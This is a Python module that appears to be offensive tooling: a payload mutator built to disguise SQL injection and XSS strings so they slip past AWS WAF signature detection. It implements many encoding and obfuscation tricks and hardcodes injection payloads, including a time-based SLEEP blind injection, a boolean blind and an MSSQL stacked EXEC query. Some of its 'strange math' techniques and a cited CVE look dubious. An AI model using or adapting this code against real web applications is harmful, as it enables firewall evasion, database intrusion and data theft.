#!/usr/bin/env python3
"""
SENTINEL Strike v3.0 — Ultimate Payload Mutator

Advanced SQLi/XSS payload obfuscation to bypass AWS WAF signature detection.
Implements 20+ evasion techniques for maximum bypass rate.

Techniques:
- Unicode encoding (fullwidth, homoglyphs)
- Comment injection (inline, MySQL, MSSQL)
- Case randomization
- Whitespace manipulation
- Keyword splitting with CHAR()
- Double/Triple URL encoding
- JSON unicode escape
- Hex encoding
- String concatenation
- Function synonyms
- NULL byte injection
- Scientific notation
- Buffer overflow padding

Strange Math Techniques:
- Entropy-guided mutation (Shannon entropy optimization)
- Fibonacci sequence injection
- Golden ratio (φ) splitting
- Prime number obfuscation
- Chaos-based scrambling (logistic map)
- Kolmogorov complexity maximization
"""

import random
import string
import math
from typing import List, Dict, Tuple
from urllib.parse import quote


class UltimatePayloadMutator:
    """
    Ultimate payload mutator for WAF bypass.

    Combines 15+ obfuscation techniques to evade signature-based detection.
    """

    # Unicode fullwidth characters (bypasses ASCII-only regex)
    FULLWIDTH_MAP = {
        'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ',
        'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
        'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ',
        'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
        'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ',
        'a': 'ａ', 'b': 'ｂ', 'c': 'ｃ', 'd': 'ｄ', 'e': 'ｅ',
        'f': 'ｆ', 'g': 'ｇ', 'h': 'ｈ', 'i': 'ｉ', 'j': 'ｊ',
        'k': 'ｋ', 'l': 'ｌ', 'm': 'ｍ', 'n': 'ｎ', 'o': 'ｏ',
        'p': 'ｐ', 'q': 'ｑ', 'r': 'ｒ', 's': 'ｓ', 't': 'ｔ',
        'u': 'ｕ', 'v': 'ｖ', 'w': 'ｗ', 'x': 'ｘ', 'y': 'ｙ', 'z': 'ｚ',
        '0': '０', '1': '１', '2': '２', '3': '３', '4': '４',
        '5': '５', '6': '６', '7': '７', '8': '８', '9': '９',
        '=': '＝', "'": '＇', '"': '＂', '<': '＜', '>': '＞',
        '(': '（', ')': '）', ' ': '　',
    }

    # Unicode homoglyphs (visually similar characters)
    HOMOGLYPHS = {
        'a': ['а', 'ɑ', 'α'],  # Cyrillic а, Latin ɑ, Greek α
        'e': ['е', 'ɛ', 'ε'],  # Cyrillic е, Latin ɛ, Greek ε
        'o': ['о', 'ο', 'ᴏ'],  # Cyrillic о, Greek ο
        'c': ['с', 'ϲ'],       # Cyrillic с, Greek lunate sigma
        'p': ['р', 'ρ'],       # Cyrillic р, Greek ρ
        's': ['ѕ', 'ꜱ'],       # Cyrillic ѕ
        'x': ['х', 'χ'],       # Cyrillic х, Greek χ
        'i': ['і', 'ι'],       # Cyrillic і, Greek ι
        'l': ['ӏ', 'ⅼ'],       # Cyrillic palochka, Roman numeral
        'u': ['υ', 'ս'],       # Greek υ, Armenian ս
    }

    # SQL function synonyms
    FUNCTION_SYNONYMS = {
        'substring': ['substr', 'mid', 'left', 'right'],
        'ascii': ['ord', 'hex', 'bin'],
        'char': ['chr'],
        'concat': ['concat_ws', '||'],
        'sleep': ['benchmark', 'pg_sleep', 'waitfor delay'],
        'version': ['@@version', 'version()'],
    }

    # SQL comments variants
    COMMENTS = [
        '/**/', '/*foo*/', '/*!*/', '/*-*/', '/**_**/',
        '-- ', '#', '--/*', '/*--*/', '/*%00*/',
        '/*%0a*/', '/*%0d*/', '/*%09*/', '/***/',
    ]

    # Whitespace alternatives
    WHITESPACE = [
        '%09',  # Tab
        '%0a',  # Newline
        '%0b',  # Vertical tab
        '%0c',  # Form feed
        '%0d',  # Carriage return
        '%20',  # Space
        '%a0',  # Non-breaking space
        '/**/', '+',
    ]

    def __init__(self, aggression: int = 5):
        """
        Initialize mutator.

        Args:
            aggression: 1-10, higher = more aggressive mutations
        """
        self.aggression = aggression

    # =========================================================================
    # ENCODING TECHNIQUES
    # =========================================================================

    def url_encode(self, payload: str, level: int = 1) -> str:
        """URL encode with configurable levels (double, triple encoding)."""
        result = payload
        for _ in range(level):
            result = quote(result, safe='')
        return result

    def hex_encode(self, payload: str) -> str:
        """Convert string to hex encoding."""
        return '0x' + payload.encode().hex()

    def unicode_escape(self, payload: str) -> str:
        r"""JSON-style unicode escape (\uXXXX)."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def char_encode(self, payload: str, db_type: str = 'mysql') -> str:
        """Encode using CHAR() function."""
        if db_type == 'mysql':
            chars = ','.join(str(ord(c)) for c in payload)
            return f'CHAR({chars})'
        elif db_type == 'mssql':
            return '+'.join(f'CHAR({ord(c)})' for c in payload)
        else:
            return payload

    def fullwidth_encode(self, payload: str) -> str:
        """Convert to Unicode fullwidth characters."""
        return ''.join(self.FULLWIDTH_MAP.get(c, c) for c in payload)

    def homoglyph_encode(self, payload: str, ratio: float = 0.3) -> str:
        """Replace characters with visually similar homoglyphs."""
        result = []
        for c in payload:
            if c.lower() in self.HOMOGLYPHS and random.random() < ratio:
                result.append(random.choice(self.HOMOGLYPHS[c.lower()]))
            else:
                result.append(c)
        return ''.join(result)

    # =========================================================================
    # OBFUSCATION TECHNIQUES
    # =========================================================================

    def case_randomize(self, payload: str) -> str:
        """Randomize character case."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    def comment_inject(self, payload: str) -> str:
        """Insert SQL comments between keywords."""
        comment = random.choice(self.COMMENTS)
        # Split known SQL keywords
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                    'INSERT', 'UPDATE', 'DELETE', 'DROP', 'ORDER', 'GROUP']
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                # Insert comment in middle of keyword
                mid = len(kw) // 2
                replacement = kw[:mid] + comment + kw[mid:]
                result = result.replace(kw, replacement)
                result = result.replace(kw.lower(), replacement.lower())
                result = result.replace(kw.upper(), replacement.upper())
        return result

    def whitespace_mutate(self, payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        ws = random.choice(self.WHITESPACE)
        return payload.replace(' ', ws)

    def keyword_split(self, payload: str) -> str:
        """Split SQL keywords using CONCAT or +."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE']
        result = payload
        for kw in keywords:
            if kw in result.upper():
                # Split into CONCAT
                mid = len(kw) // 2
                split = f"CONCAT('{kw[:mid]}','{kw[mid:]}')"
                result = result.replace(kw, split)
                result = result.replace(kw.lower(), split)
        return result

    def string_concat(self, payload: str) -> str:
        """Break strings using concatenation."""
        # 'admin' -> 'adm'+'in' or 'adm'||'in'
        concat_op = random.choice(['+', '||', "','"])
        result = []
        i = 0
        while i < len(payload):
            if payload[i] == "'" and i + 3 < len(payload):
                # Find closing quote
                end = payload.find("'", i + 1)
                if end > i + 2:
                    content = payload[i+1:end]
                    mid = len(content) // 2
                    split = f"'{content[:mid]}'{concat_op}'{content[mid:]}'"
                    result.append(split)
                    i = end + 1
                    continue
            result.append(payload[i])
            i += 1
        return ''.join(result)

    def null_byte_inject(self, payload: str) -> str:
        """Inject NULL bytes to terminate strings early."""
        return payload.replace("'", "'%00")

    def buffer_padding(self, payload: str, size: int = 100) -> str:
        """Add buffer overflow padding to evade length-based detection."""
        padding = random.choice(['A', '0', 'x', ' ']) * size
        return payload + padding

    def scientific_notation(self, payload: str) -> str:
        """Use scientific notation for numbers."""
        # Replace numbers with scientific notation
        import re

        def replace_num(m):
            n = int(m.group())
            if n > 0:
                return f'{n}e0'
            return str(n)
        return re.sub(r'\b\d+\b', replace_num, payload)

    # =========================================================================
    # STRANGE MATH TECHNIQUES
    # =========================================================================

    def _shannon_entropy(self, s: str) -> float:
        """Calculate Shannon entropy of a string."""
        if not s:
            return 0.0
        freq = {}
        for c in s:
            freq[c] = freq.get(c, 0) + 1
        length = len(s)
        return -sum((count/length) * math.log2(count/length) for count in freq.values())

    def entropy_guided_mutate(self, payload: str) -> str:
        """
        Entropy-guided mutation.

        Maximize Shannon entropy to evade statistical analysis.
        WAFs may use entropy-based detection to identify obfuscated payloads.
        We add noise characters to normalize entropy.
        """
        current_entropy = self._shannon_entropy(payload)
        target_entropy = 4.5  # Normal text entropy (~4.5 bits)

        if current_entropy > target_entropy:
            # Too high entropy - add repeated chars to reduce
            result = []
            for i, c in enumerate(payload):
                result.append(c)
                if i % 3 == 0:
                    result.append(random.choice(['a', 'e', 'i', 'o', 'u']))
            return ''.join(result)
        else:
            # Too low entropy - add random chars to increase
            noise_chars = list('!@#$%^&*()[]{}|;:,.<>?')
            result = []
            for c in payload:
                result.append(c)
                if random.random() < 0.15:
                    result.append(random.choice(noise_chars))
            return ''.join(result)

    def fibonacci_inject(self, payload: str) -> str:
        """
        Fibonacci sequence injection.

        Insert characters at Fibonacci positions to break regex patterns.
        WAF regex typically looks for contiguous patterns.
        """
        def fib_sequence(n):
            fibs = [0, 1]
            while fibs[-1] < n:
                fibs.append(fibs[-1] + fibs[-2])
            return set(fibs)

        fib_positions = fib_sequence(len(payload) + 20)
        inject_char = random.choice(['/**/', '%00', '/*!', '*/'])

        result = []
        for i, c in enumerate(payload):
            if i in fib_positions:
                result.append(inject_char)
            result.append(c)

        return ''.join(result)

    def golden_ratio_split(self, payload: str) -> str:
        """
        Golden ratio (φ ≈ 1.618) splitting.

        Split payload at golden ratio points for optimal obfuscation.
        Mathematically pleasing splits may confuse pattern matching.
        """
        PHI = 1.618033988749895

        length = len(payload)
        if length < 5:
            return payload

        # Calculate golden section points
        split1 = int(length / PHI)
        split2 = int(split1 / PHI)

        # Insert comments at golden ratio points
        parts = [
            payload[:split2],
            '/**/',
            payload[split2:split1],
            '/**/',
            payload[split1:]
        ]

        return ''.join(parts)

    def prime_obfuscate(self, payload: str) -> str:
        """
        Prime number obfuscation.

        Transform characters at prime positions using prime-based encoding.
        """
        def is_prime(n):
            if n < 2:
                return False
            for i in range(2, int(n ** 0.5) + 1):
                if n % i == 0:
                    return False
            return True

        result = []
        for i, c in enumerate(payload):
            if is_prime(i) and c.isalpha():
                # Shift by next prime
                shift = 2 if i < 5 else 3
                if c.isupper():
                    shifted = chr((ord(c) - 65 + shift) % 26 + 65)
                else:
                    shifted = chr((ord(c) - 97 + shift) % 26 + 97)
                result.append(shifted)
            else:
                result.append(c)

        return ''.join(result)

    def chaos_scramble(self, payload: str) -> str:
        """
        Chaos-based scrambling using logistic map.

        x_{n+1} = r * x_n * (1 - x_n)

        Deterministic but unpredictable transformations.
        """
        r = 3.9  # Chaotic regime (r > 3.57)
        x = 0.1 + (hash(payload) % 1000) / 10000  # Seed from payload

        result = []
        for c in payload:
            x = r * x * (1 - x)  # Iterate logistic map

            if x > 0.7 and c.isalpha():
                # Transform based on chaos value
                result.append(c.swapcase())
            elif x < 0.3 and c == ' ':
                # Replace space with comment
                result.append('/**/')
            else:
                result.append(c)

        return ''.join(result)

    def kolmogorov_maximize(self, payload: str) -> str:
        """
        Kolmogorov complexity maximization.

        Make payload incompressible by adding seemingly random but valid data.
        High Kolmogorov complexity = hard to detect patterns.
        """
        # Use digits of pi for pseudo-random but deterministic data
        pi_digits = "14159265358979323846264338327950288419716939937510"

        result = []
        pi_idx = 0

        for i, c in enumerate(payload):
            result.append(c)

            # Add pi-based noise periodically
            if i % 5 == 0 and pi_idx < len(pi_digits):
                noise = f'/*{pi_digits[pi_idx]}*/'
                result.append(noise)
                pi_idx += 1

        return ''.join(result)

    # =========================================================================
    # COMBINED TECHNIQUES
    # =========================================================================

    def mutate(self, payload: str, techniques: List[str] = None) -> str:
        """
        Apply multiple mutation techniques to payload.

        Args:
            payload: Original SQLi payload
            techniques: List of technique names to apply, or None for auto

        Returns:
            Mutated payload
        """
        if techniques is None:
            # Auto-select based on aggression
            techniques = self._select_techniques()

        result = payload

        for technique in techniques:
            if technique == 'case':
                result = self.case_randomize(result)
            elif technique == 'comment':
                result = self.comment_inject(result)
            elif technique == 'whitespace':
                result = self.whitespace_mutate(result)
            elif technique == 'url_encode':
                result = self.url_encode(result)
            elif technique == 'double_url':
                result = self.url_encode(result, level=2)
            elif technique == 'triple_url':
                result = self.url_encode(result, level=3)
            elif technique == 'hex':
                result = self.hex_encode(result)
            elif technique == 'unicode':
                result = self.unicode_escape(result)
            elif technique == 'char':
                result = self.char_encode(result)
            elif technique == 'fullwidth':
                result = self.fullwidth_encode(result)
            elif technique == 'homoglyph':
                result = self.homoglyph_encode(result)
            elif technique == 'concat':
                result = self.string_concat(result)
            elif technique == 'null':
                result = self.null_byte_inject(result)
            elif technique == 'padding':
                result = self.buffer_padding(result)
            elif technique == 'scientific':
                result = self.scientific_notation(result)
            elif technique == 'keyword_split':
                result = self.keyword_split(result)
            # Strange Math techniques
            elif technique == 'entropy':
                result = self.entropy_guided_mutate(result)
            elif technique == 'fibonacci':
                result = self.fibonacci_inject(result)
            elif technique == 'golden_ratio':
                result = self.golden_ratio_split(result)
            elif technique == 'prime':
                result = self.prime_obfuscate(result)
            elif technique == 'chaos':
                result = self.chaos_scramble(result)
            elif technique == 'kolmogorov':
                result = self.kolmogorov_maximize(result)

        # Ensure result is HTTP-safe (encode non-ASCII to avoid latin-1 errors)
        # Only encode if result contains non-ASCII characters
        try:
            result.encode('latin-1')
        except UnicodeEncodeError:
            # URL-encode non-ASCII characters for HTTP safety
            safe_result = []
            for char in result:
                try:
                    char.encode('latin-1')
                    safe_result.append(char)
                except UnicodeEncodeError:
                    safe_result.append(quote(char))
            result = ''.join(safe_result)

        return result

    def _select_techniques(self) -> List[str]:
        """Select techniques based on aggression level."""
        # HTTP-safe techniques only (no Unicode that causes latin-1 errors)
        basic_techniques = [
            'case', 'comment', 'whitespace', 'url_encode',
            'double_url', 'hex', 'char', 'concat',
            'null', 'padding', 'scientific', 'keyword_split',
            # Removed: 'fullwidth', 'homoglyph', 'unicode' - cause encoding errors
        ]

        # Strange Math techniques (HTTP-safe only)
        strange_math = [
            'fibonacci', 'golden_ratio', 'prime', 'chaos', 'kolmogorov',
            # Removed: 'entropy' - adds special chars that break HTTP
        ]

        # Add Strange Math at aggression >= 7
        if self.aggression >= 7:
            all_techniques = basic_techniques + strange_math
        else:
            all_techniques = basic_techniques

        # More techniques at higher aggression
        count = min(self.aggression // 2 + 1, len(all_techniques))
        return random.sample(all_techniques, count)

    def generate_variants(self, payload: str, count: int = 10) -> List[str]:
        """
        Generate multiple mutated variants of a payload.

        Args:
            payload: Original payload
            count: Number of variants to generate

        Returns:
            List of mutated payloads
        """
        variants = []

        for _ in range(count):
            techniques = self._select_techniques()
            mutated = self.mutate(payload, techniques)
            variants.append(mutated)

        return variants

    def get_aws_waf_bypasses(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate AWS WAF-specific bypass payloads.

        Returns list of (payload, technique_description) tuples.
        """
        bypasses = []

        # 1. JSON unicode escape (CVE-2022-44877 style)
        json_bypass = '{"q": "' + self.unicode_escape(payload) + '"}'
        bypasses.append((json_bypass, "JSON Unicode Escape"))

        # 2. Double URL encoding
        double_url = self.url_encode(payload, level=2)
        bypasses.append((double_url, "Double URL Encoding"))

        # 3. Comment injection + case randomization
        commented = self.comment_inject(self.case_randomize(payload))
        bypasses.append((commented, "Comment + Case Mix"))

        # 4. Keyword split (instead of Fullwidth - HTTP safe)
        keyword_split = self.keyword_split(payload)
        bypasses.append((keyword_split, "Keyword Split"))

        # 5. CHAR() obfuscation
        char_enc = self.char_encode(payload)
        bypasses.append((char_enc, "CHAR() Encoding"))

        # 6. Whitespace + NULL byte
        ws_null = self.null_byte_inject(self.whitespace_mutate(payload))
        bypasses.append((ws_null, "Whitespace + NULL"))

        # 7. Concat split + case (instead of Homoglyph - HTTP safe)
        concat = self.string_concat(self.case_randomize(payload))
        bypasses.append((concat, "Concat Split"))

        # 8. Scientific notation (for blind SQLi)
        sci = self.scientific_notation(payload)
        bypasses.append((sci, "Scientific Notation"))

        # 9. Triple URL encoding (aggressive)
        triple = self.url_encode(payload, level=3)
        bypasses.append((triple, "Triple URL Encoding"))

        # 10. Hex encoding
        hex_enc = self.hex_encode(payload)
        bypasses.append((hex_enc, "Hex Encoding"))

        # 11. Buffer padding
        padded = self.buffer_padding(payload, size=200)
        bypasses.append((padded, "Buffer Padding"))

        # 12. String concatenation
        concat = self.string_concat(payload)
        bypasses.append((concat, "String Concat"))

        # 13. Mixed: Double URL + Comment (HTTP-safe)
        mixed1 = self.comment_inject(self.url_encode(payload, level=2))
        bypasses.append((mixed1, "Double URL + Comment"))

        # 14. Mixed: Case + Whitespace + Hex (HTTP-safe)
        mixed2 = self.whitespace_mutate(
            self.hex_encode(
                self.case_randomize(payload)
            )
        )
        bypasses.append((mixed2, "Case + WS + Hex"))

        # 15. Nuclear: All techniques combined (HTTP-safe only)
        nuclear = payload
        for technique in ['case', 'comment', 'whitespace', 'keyword_split']:
            nuclear = self.mutate(nuclear, [technique])
        bypasses.append((nuclear, "Nuclear Combo"))

        # ========= AWS WAF SPECIFIC BYPASSES =========

        # 16. JSON Object Injection (AWS WAF weakness)
        # AWS WAF may not parse JSON properly when mixed with SQL
        json_obj = '{"__proto__": {"query":"' + \
            payload.replace('"', '\\"') + '"}}'
        bypasses.append((json_obj, "JSON Proto Pollution"))

        # 17. Parameterless Time-Based (no SELECT/UNION keywords)
        # Uses only comparison and sleep - harder to detect
        time_based = "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--"
        time_based = self.comment_inject(self.case_randomize(time_based))
        bypasses.append((time_based, "Time-Based Blind"))

        # 18. Boolean-Based without UNION (HTTP-safe)
        boolean_blind = "1' AND '1'='1"
        boolean_blind = self.case_randomize(boolean_blind)
        bypasses.append((boolean_blind, "Boolean Blind"))

        # 19. Stacked Queries with EXEC (MSSQL bypass)
        stacked = "1'; EXEC('SEL'+'ECT @@version')--"
        bypasses.append((stacked, "MSSQL EXEC Bypass"))

        # 20. Alternative Operators (no = sign)
        alt_ops = "1' AND 1 LIKE 1--"
        alt_ops = self.comment_inject(alt_ops)
        bypasses.append((alt_ops, "LIKE Operator Bypass"))

        # 21. Strange Math: Fibonacci + Golden Ratio
        strange_math = self.golden_ratio_split(self.fibonacci_inject(payload))
        bypasses.append((strange_math, "Strange Math Combo"))

        # 22. Strange Math: Chaos + Kolmogorov
        chaos_kol = self.kolmogorov_maximize(self.chaos_scramble(payload))
        bypasses.append((chaos_kol, "Chaos + Kolmogorov"))

        # 23. Strange Math: Entropy + Prime
        entropy_prime = self.prime_obfuscate(
            self.entropy_guided_mutate(payload))
        bypasses.append((entropy_prime, "Entropy + Prime"))

        # 24. XML Encoded SQLi
        xml_encoded = f"<![CDATA[{payload}]]>"
        bypasses.append((xml_encoded, "CDATA Wrapper"))

        # 25. Alternative Quote Attack (HTTP-safe)
        alt_quote = payload.replace("'", "%27").replace("=", "%3D")
        bypasses.append((alt_quote, "URL Quote Bypass"))

        return bypasses


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

def create_mutator(aggression: int = 5) -> UltimatePayloadMutator:
    """Create payload mutator with aggression level."""
    return UltimatePayloadMutator(aggression)


def mutate_payload(payload: str, aggression: int = 5) -> str:
    """Quick mutate a single payload."""
    mutator = UltimatePayloadMutator(aggression)
    return mutator.mutate(payload)


def get_waf_bypasses(payload: str) -> List[Tuple[str, str]]:
    """Generate AWS WAF bypass variants."""
    mutator = UltimatePayloadMutator(10)
    return mutator.get_aws_waf_bypasses(payload)


# Available techniques for export
MUTATION_TECHNIQUES = [
    "case", "comment", "whitespace", "url_encode", "double_url",
    "triple_url", "hex", "unicode", "char", "fullwidth",
    "homoglyph", "concat", "null", "padding", "scientific",
    "keyword_split",
]
